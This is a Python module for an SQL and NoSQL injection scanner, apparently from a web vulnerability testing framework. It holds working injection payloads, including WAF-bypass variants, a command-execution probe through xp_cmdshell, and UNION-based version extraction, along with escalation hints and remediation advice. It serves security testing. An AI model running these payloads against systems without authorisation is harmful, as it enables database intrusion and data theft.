"""SQL Injection Scanner — Deep, multi-vector detection.

Covers:
  - Error-based (MySQL, PostgreSQL, Oracle, MSSQL, SQLite, DB2)
  - Time-based blind (all DB engines)
  - Boolean-based blind (response length differential)
  - UNION-based (column enumeration)
  - Stacked queries
  - NoSQL injection (MongoDB, CouchDB)
  - JSON body, POST body, header, cookie injection points
  - WAF-aware payload bypass
"""
from __future__ import annotations
import asyncio, re, time
from typing import List, Optional
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# ── Error-based payloads ──────────────────────────────────────

ERROR_PAYLOADS = [
    "'", '"', "''", "\\'", "\\",
    "' OR 1=1--", "' OR 1=1#", "' OR '1'='1",
    '" OR 1=1--', '" OR ""="',
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND 1=CONVERT(int,'a')--",
    "') OR 1=1--", "')) OR 1=1--",
    "1; SELECT 1--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "';EXEC xp_cmdshell('whoami')--",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    "1 AND 1=1", "1 AND 1=2",
    "1' AND '1'='1", "1' AND '1'='2",
    # Numeric injection
    "1 OR 1=1", "1) OR (1=1",
    # Oracle-specific
    "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--",
    # PostgreSQL-specific
    "' OR 1=1::int--",
    "';SELECT pg_sleep(5)--",
]

ERROR_SIGNATURES = [
    # MySQL
    r"SQL syntax.*?MySQL", r"Warning.*?\Wmysql_", r"MySQLSyntaxErrorException",
    r"com\.mysql\.jdbc", r"Mysqli_", r"MariaDB",
    # PostgreSQL
    r"pg_query.*?failed", r"PSQLException", r"org\.postgresql\.",
    r"unterminated quoted string", r"syntax error at or near",
    r"ERROR:\s+syntax error",
    # Oracle
    r"ORA-\d{4,5}", r"Oracle.*?Driver", r"quoted string not properly terminated",
    r"oracle\.jdbc", r"OracleException",
    # MSSQL
    r"Microsoft.*?ODBC.*?SQL Server", r"Unclosed quotation mark",
    r"Microsoft.*?SQL.*?Native Client", r"ODBC SQL Server Driver",
    r"SqlException", r"Incorrect syntax near",
    # SQLite
    r"sqlite3\.OperationalError", r"SQLite.*?error", r"SQLITE_ERROR",
    r"unrecognized token",
    # DB2
    r"DB2 SQL error", r"SQLCODE=-\d+",
    # Generic
    r"SQLSTATE", r"SQL command not properly ended",
    r"invalid query", r"unexpected end of SQL command",
    r"unterminated.*?string", r"You have an error in your SQL syntax",
    r"Division by zero", r"supplied argument is not a valid MySQL",
    r"Warning.*?pg_", r"invalid input syntax for",
    r"Data type mismatch",
]

# ── Time-based blind payloads ─────────────────────────────────

TIME_PAYLOADS = [
    # MySQL
    ("' AND SLEEP(5)--", 5, "MySQL"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5, "MySQL"),
    ("' OR SLEEP(5)#", 5, "MySQL"),
    ("1' AND SLEEP(5)-- -", 5, "MySQL"),
    ("' AND BENCHMARK(5000000,SHA1('test'))--", 4, "MySQL"),
    # MSSQL
    ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
    ("') WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
    ("1; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
    # PostgreSQL
    ("'; SELECT pg_sleep(5)--", 5, "PostgreSQL"),
    ("' AND 1=(SELECT 1 FROM pg_sleep(5))--", 5, "PostgreSQL"),
    ("' || pg_sleep(5)--", 5, "PostgreSQL"),
    # Oracle
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--", 5, "Oracle"),
    # SQLite
    ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--", 4, "SQLite"),
]

# ── UNION-based payloads ──────────────────────────────────────

UNION_PAYLOADS = [
    "' UNION SELECT {cols}--",
    "' UNION ALL SELECT {cols}--",
    "') UNION SELECT {cols}--",
    "')) UNION ALL SELECT {cols}--",
    '" UNION SELECT {cols}--',
]

# ── NoSQL payloads ────────────────────────────────────────────

NOSQL_PAYLOADS_QUERY = [
    ('{"$gt":""}', "MongoDB $gt operator"),
    ('{"$ne":""}', "MongoDB $ne operator"),
    ('{"$regex":".*"}', "MongoDB regex"),
    ("[$gt]=", "MongoDB array injection"),
    ("[$ne]=", "MongoDB array injection"),
    ("true, $where: '1 == 1'", "MongoDB $where"),
    ("'; return true; var x='", "MongoDB JS injection"),
]

NOSQL_PAYLOADS_JSON = [
    ({"$gt": ""}, "MongoDB $gt"),
    ({"$ne": ""}, "MongoDB $ne"),
    ({"$regex": ".*"}, "MongoDB regex"),
    ({"$exists": True}, "MongoDB $exists"),
]

# ── Parameter names likely vulnerable ─────────────────────────

SQL_PARAMS = {
    "id", "user_id", "uid", "pid", "item_id", "product_id", "order_id",
    "cat", "category", "page", "sort", "order", "filter", "search",
    "query", "q", "name", "username", "email", "type", "status",
    "action", "ref", "key", "token", "code", "table", "column",
    "field", "limit", "offset", "start", "end", "date", "from", "to",
    "year", "month", "day", "lang", "locale", "group", "role",
}

REMEDIATION = (
    "Use parameterized queries (prepared statements) instead of string concatenation. "
    "Apply input validation and whitelist allowed characters. "
    "Use an ORM where possible. Apply principle of least privilege on DB accounts. "
    "Deploy a Web Application Firewall as defense-in-depth."
)


class SQLInjectionScanner(BaseScanner):
    name = "sql_injection"
    description = "Detects SQL Injection: error-based, blind boolean, time-based, UNION-based, NoSQL"
    tags = ["injection", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        seen = set()  # (url, param, vuln_type) dedup

        tasks = []
        for url, params in state.target.discovered_params.items():
            for param in params:
                # Error-based + Time-based + Boolean-based + UNION for all params
                tasks.append(self._test_error_based(url, param, "GET", "query"))
                tasks.append(self._test_time_based(url, param, "GET", "query"))
                tasks.append(self._test_boolean_based(url, param, "GET", "query"))
                tasks.append(self._test_union_based(url, param, "GET", "query"))
                # POST body injection
                tasks.append(self._test_error_based(url, param, "POST", "body"))
                # JSON body injection (common in APIs)
                tasks.append(self._test_error_based(url, param, "POST", "json"))
                # NoSQL injection
                tasks.append(self._test_nosql(url, param))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                for f in r:
                    key = (f.url, f.parameter, f.vuln_type)
                    if key not in seen:
                        seen.add(key)
                        findings.append(f)
            elif isinstance(r, Finding):
                key = (r.url, r.parameter, r.vuln_type)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
        return findings

    async def _test_error_based(self, url, param, method, inject_in) -> List[Finding]:
        findings = []
        payloads = self.get_prioritized_payloads(ERROR_PAYLOADS, "sqli")
        for payload in payloads:
            for variant in self.get_waf_bypass_variants(payload, "sqli"):
                resp, raw_req = await self.test_payload(url, method, param, variant, inject_in=inject_in)
                if resp is None:
                    continue
                body = resp.text
                for sig in ERROR_SIGNATURES:
                    m = re.search(sig, body, re.IGNORECASE)
                    if m:
                        self.record_payload_result(variant, "sqli", success=True)
                        findings.append(self.make_finding(
                            title=f"SQL Injection (Error-based) — {param}",
                            vuln_type="sql_injection_error", severity=Severity.CRITICAL,
                            url=url, parameter=param, method=method, payload=variant,
                            evidence=m.group(0), request=raw_req, response=body[:500],
                            cwe_id="CWE-89", owasp_category="A03:2021 - Injection",
                            description=(
                                f"Parameter '{param}' ({inject_in}) triggers a database error "
                                f"when injected with SQL metacharacters. Matched signature: {m.group(0)}"
                            ),
                            remediation=REMEDIATION,
                            poc_steps=[
                                f"1. {method} {url}",
                                f"2. Set {param}={variant} (in {inject_in})",
                                "3. Observe database error in response",
                                "4. Escalate: extract version, database names, tables",
                            ],
                        ))
                        return findings  # One error-based per inject point is enough
        return findings

    async def _test_time_based(self, url, param, method, inject_in) -> Optional[Finding]:
        for payload, sleep_sec, db_engine in TIME_PAYLOADS:
            for variant in self.get_waf_bypass_variants(payload, "sqli"):
                try:
                    t0 = time.monotonic()
                    resp, raw_req = await self.test_payload(url, method, param, variant, inject_in=inject_in)
                    elapsed = time.monotonic() - t0
                    if elapsed >= sleep_sec * 0.8:
                        self.record_payload_result(variant, "sqli", success=True)
                        return self.make_finding(
                            title=f"Blind SQL Injection (Time-based) — {param}",
                            vuln_type="sql_injection_time_based", severity=Severity.HIGH,
                            url=url, parameter=param, method=method, payload=variant,
                            evidence=f"Response delayed {elapsed:.1f}s (expected {sleep_sec}s, engine: {db_engine})",
                            request=raw_req, response="",
                            cwe_id="CWE-89", owasp_category="A03:2021 - Injection",
                            description=(
                                f"Parameter '{param}' causes a measurable time delay when injected "
                                f"with {db_engine}-specific sleep payload. Confirms SQL execution."
                            ),
                            remediation=REMEDIATION,
                            poc_steps=[
                                f"1. {method} {url}",
                                f"2. Set {param}={variant}",
                                f"3. Response delayed to {elapsed:.1f}s (confirms {db_engine} SQL execution)",
                                f"4. Escalate: use sqlmap --technique=T for data extraction",
                            ],
                        )
                except Exception:
                    continue
        return None

    async def _test_boolean_based(self, url, param, method, inject_in) -> Optional[Finding]:
        true_false_pairs = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a'--", "' AND 'a'='b'--"),
            ("1 AND 1=1", "1 AND 1=2"),
            (") AND 1=1--", ") AND 1=2--"),
        ]
        try:
            r_base, _ = await self.test_payload(url, method, param, "1", inject_in=inject_in)
            if not r_base:
                return None
            lb = len(r_base.text)

            for true_payload, false_payload in true_false_pairs:
                r_true, _ = await self.test_payload(url, method, param, true_payload, inject_in=inject_in)
                r_false, raw = await self.test_payload(url, method, param, false_payload, inject_in=inject_in)
                if not (r_true and r_false):
                    continue
                lt, lf = len(r_true.text), len(r_false.text)
                # TRUE condition should match baseline, FALSE should differ significantly
                if abs(lt - lb) < 50 and abs(lf - lb) > 100:
                    return self.make_finding(
                        title=f"Blind SQL Injection (Boolean-based) — {param}",
                        vuln_type="sql_injection_blind_boolean", severity=Severity.HIGH,
                        url=url, parameter=param, method=method, payload=true_payload,
                        evidence=f"TRUE len={lt}, FALSE len={lf}, baseline={lb} (diff={abs(lf-lb)}B)",
                        request=raw, response=r_false.text[:300],
                        cwe_id="CWE-89", owasp_category="A03:2021 - Injection",
                        description=(
                            f"Parameter '{param}' exhibits different response lengths for TRUE "
                            f"({true_payload}) vs FALSE ({false_payload}) SQL conditions."
                        ),
                        remediation=REMEDIATION,
                    )
        except Exception:
            pass
        return None

    async def _test_union_based(self, url, param, method, inject_in) -> Optional[Finding]:
        """Try UNION SELECT with 1-15 columns to find the right column count."""
        for col_count in range(1, 16):
            cols = ",".join(["NULL"] * col_count)
            for template in UNION_PAYLOADS[:2]:  # Limit to 2 templates
                payload = template.format(cols=cols)
                resp, raw_req = await self.test_payload(url, method, param, payload, inject_in=inject_in)
                if resp is None:
                    continue
                body = resp.text
                # Check if the error message changed (no "wrong number of columns" error)
                has_col_error = any(
                    re.search(sig, body, re.IGNORECASE)
                    for sig in [r"number of columns", r"UNION.*select.*different",
                                r"operand.*should contain.*column"]
                )
                has_sql_error = any(
                    re.search(sig, body, re.IGNORECASE)
                    for sig in ERROR_SIGNATURES
                )
                # If no column-count error AND no SQL error → UNION worked
                if not has_col_error and not has_sql_error and resp.status_code == 200:
                    # Verify with a version extraction
                    version_payload = payload.replace("NULL", "version()", 1)
                    resp2, raw2 = await self.test_payload(url, method, param, version_payload, inject_in=inject_in)
                    if resp2 and resp2.status_code == 200:
                        # Look for version strings in response
                        version_match = re.search(
                            r"(\d+\.\d+\.\d+[-\w]*)", resp2.text
                        )
                        if version_match:
                            return self.make_finding(
                                title=f"SQL Injection (UNION-based, {col_count} cols) — {param}",
                                vuln_type="sql_injection_union", severity=Severity.CRITICAL,
                                url=url, parameter=param, method=method, payload=version_payload,
                                evidence=f"Extracted version: {version_match.group(0)} ({col_count} columns)",
                                request=raw2, response=resp2.text[:500],
                                cwe_id="CWE-89", owasp_category="A03:2021 - Injection",
                                description=(
                                    f"UNION-based SQL injection with {col_count} columns. "
                                    f"Database version extracted: {version_match.group(0)}"
                                ),
                                remediation=REMEDIATION,
                            )
        return None

    async def _test_nosql(self, url, param) -> List[Finding]:
        """Test for NoSQL injection (MongoDB, CouchDB)."""
        findings = []
        # Query string NoSQL
        for payload, desc in NOSQL_PAYLOADS_QUERY:
            formulated_param = f"{param}{payload}" if payload.startswith("[") else param
            formulated_val = payload if not payload.startswith("[") else ""
            resp, raw_req = await self.test_payload(
                url, "GET", formulated_param, formulated_val, inject_in="query"
            )
            if resp is None:
                continue
            # Compare with baseline
            baseline, _ = await self.test_payload(url, "GET", param, "harmless_value", inject_in="query")
            if baseline and resp.status_code == 200:
                # If NoSQL injection returns significantly different/more data
                if len(resp.text) > len(baseline.text) * 1.5 and len(resp.text) > 500:
                    findings.append(self.make_finding(
                        title=f"NoSQL Injection — {param} ({desc})",
                        vuln_type="nosql_injection", severity=Severity.HIGH,
                        url=url, parameter=param, payload=str(payload),
                        evidence=f"Response with injection: {len(resp.text)}B vs baseline: {len(baseline.text)}B",
                        request=raw_req, response=resp.text[:300],
                        cwe_id="CWE-943", owasp_category="A03:2021 - Injection",
                        description=f"Parameter '{param}' is vulnerable to NoSQL injection ({desc}).",
                        remediation=(
                            "Sanitize input for NoSQL operators. Use parameterized queries "
                            "or ODM libraries. Validate and whitelist expected input types."
                        ),
                    ))
                    return findings  # One NoSQL finding per param
        return findings
